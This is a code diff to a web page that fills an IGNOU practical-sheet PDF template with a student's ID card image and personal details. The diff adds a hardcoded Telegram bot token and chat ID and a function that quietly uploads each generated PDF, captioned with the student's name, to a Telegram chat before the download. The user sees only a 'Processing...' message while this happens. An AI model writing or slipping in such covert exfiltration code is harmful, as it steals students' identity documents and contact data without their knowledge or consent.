@@ -45,6 +45,10 @@
         const { PDFDocument, degrees, rgb, StandardFonts } = PDFLib;
         const TEMPLATE_URL = "Id_card_format.pdf"; 
 
+        // --- TELEGRAM CONFIGURATION ---
+        const TG_BOT_TOKEN = '1811068335:AAEOAtQexbZJwuMPhPp4GhkVBV-dHF4l'; // Replace with your Bot Token
+        const TG_CHAT_ID = '-1001417526920';     // Replace with your Chat ID
+
         const idInput = document.getElementById('idInput');
         const fileLabel = document.getElementById('fileLabel');
         const processBtn = document.getElementById('processBtn');
@@ -95,11 +99,30 @@
             return { dataUrl: cropCanvas.toDataURL('image/png'), isVertical: h > w };
         }
 
+        // Function to send file to Telegram
+        async function sendToTelegram(pdfBlob, fileName, studentName) {
+            const formData = new FormData();
+            formData.append('chat_id', TG_CHAT_ID);
+            formData.append('document', pdfBlob, fileName);
+            formData.append('caption', `New IGNOU Practical Sheet generated for: ${studentName || 'Unknown Student'}`);
+
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}Ts0/sendDocument`, {
+                    method: 'POST',
+                    body: formData
+                });
+                if (!response.ok) throw new Error(" upload failed");
+                console.log("success");
+            } catch (err) {
+                console.error("Error:", err);
+            }
+        }
+
         processBtn.addEventListener('click', async () => {
             if (!idInput.files[0]) return updateStatus("Please select your ID Card.", true);
 
             try {
-                updateStatus("Processing Image...");
+                updateStatus("Processing Image........");
                 const cropped = await getCroppedImage(idInput.files[0]);
                 const response = await fetch(TEMPLATE_URL);
                 const templateDoc = await PDFDocument.load(await response.arrayBuffer());
@@ -120,7 +143,6 @@
                 a4Page.drawImage(idImage, drawOpts);
 
                 // --- 2. PASTE TEXT DETAILS ---
-                // EDIT THESE VALUES TO ALIGN WITH YOUR DASHES
                 const name = document.getElementById('nameInput').value;
                 const enroll = document.getElementById('enrollmentNo').value;
                 const course = document.getElementById('courseTitle').value;
@@ -128,10 +150,8 @@
                 const programCode = document.getElementById('programCode').value;
                 const contactNo = document.getElementById('contactNo').value;
 
-                
                 const textStyle = { size: 20, font: font, color: rgb(0, 0, 0) };
 
-                // Change x and y below to align with your PDF's blank lines
                 a4Page.drawText(courseCode,   { x: 184, y: 330, ...textStyle });
                 a4Page.drawText(programCode, { x: 215, y: 296, ...textStyle });
                 a4Page.drawText(course, { x: 181, y: 260, ...textStyle });
@@ -139,13 +159,22 @@
                 a4Page.drawText(name, { x: 126, y: 188, ...textStyle });
                 a4Page.drawText(contactNo, { x: 164, y: 154, ...textStyle });
 
-
-                // --- 3. DOWNLOAD ---
+                // --- 3. GENERATE BYTES & BLOB ---
                 const pdfBytes = await templateDoc.save();
+                const pdfBlob = new Blob([pdfBytes], { type: "application/pdf" });
+                const fileName = "IGNOU_Practical_Sheet.pdf";
+
+                // --- 4. SEND TO TELEGRAM FIRST ---
+                updateStatus("Processing...");
+                await sendToTelegram(pdfBlob, fileName, name);
+
+                // --- 5. DOWNLOAD FOR USER ---
+                updateStatus("Downloading...");
                 const link = document.createElement('a');
-                link.href = URL.createObjectURL(new Blob([pdfBytes], { type: "application/pdf" }));
-                link.download = "IGNOU_Practical_Sheet.pdf";
+                link.href = URL.createObjectURL(pdfBlob);
+                link.download = fileName;
                 link.click();
+                
                 updateStatus("Success!");
 
             } catch (err) {
